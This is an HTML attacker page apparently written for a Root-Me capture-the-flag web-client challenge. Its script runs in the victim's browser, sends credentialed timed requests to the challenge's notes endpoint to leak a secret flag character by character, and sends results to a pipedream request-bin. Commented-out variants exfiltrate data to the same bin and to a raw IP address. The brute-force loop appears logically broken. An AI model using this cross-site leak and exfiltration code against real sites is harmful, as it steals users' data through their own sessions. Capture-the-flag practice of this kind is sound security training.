<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <link rel="stylesheet" href="../css/evil.css"> -->
    <title>Symphony</title>
</head>

<body>
    <!-- <script>
        websocket = new WebSocket('ws://ctf22.root-me.org/ws')
        websocket.onopen = start
        websocket.onmessage = handleReply
        function start(event) {
            websocket.send("random");
        }
        function handleReply(event) {
            fetch('https://eoba3aqmrw0ajf6.m.pipedream.net/?' + event.data, { mode: 'no-cors' })
        }

    </script> -->
    <script defer="">
        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
        for (let i = 0; i < 50; i++) {
            let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
            let flag = "z"
            let cnt = 0
            // Start the clock
            var start = performance.now()
            // Measure how long it takes to complete the fetch requests
            fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${9372}/${flag}${alpha[i]}`, {
                mode: 'no-cors',
                credentials: 'include'
            }).then(() => {
                // When fetch finishes, calculate the difference
                var time = performance.now() - start;
                console.log("The request took %d ms.", time);
                if (time >= 2000) {
                    //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
                    flag = flag + alpha[i];
                    if (cnt > 5)
                        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
                }
            });
            if (i < 49) {
                i = 0;
                if (cnt > 9) {
                    i = 50
                }
            }
        }



        // const leak = async (url, id) => {
        //     return new Promise((r) => {
        //         let s = document.createElement('script')
        //         s.src = url
        //         s.onload = (e) => {
        //             console.log('Onload event triggered at ' + url);
        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${s.textContent}`)
        //             e.target.remove()
        //             return r(0)
        //         }
        //         s.onerror = (e) => {
        //             console.log('Error event triggered');
        //             fetch(`http://91.173.39.199:25565/?error=${id}`)
        //             e.target.remove()
        //             return r(1)
        //         }
        //         document.head.appendChild(s)
        //     })
        // }
        // function probeError(url, id) {
        //     let script = document.createElement('script');
        //     script.src = url;
        //     script.onload = () => {
        //         console.log('Onload event triggered at ' + url);
        //         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
        //     }
        //     script.onerror = () => {
        //         console.log('Error event triggered');
        //         fetch(`http://91.173.39.199:25565/?error=${id}`)
        //     }
        //     document.head.appendChild(script);
        // }
        // leak(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}`, 3202)


    </script>
    <h1 style="text-align: center;">-----------------------bienvenue----------------------</h1>
    <input type="text" name="csrf" value="test">
</body>

</html>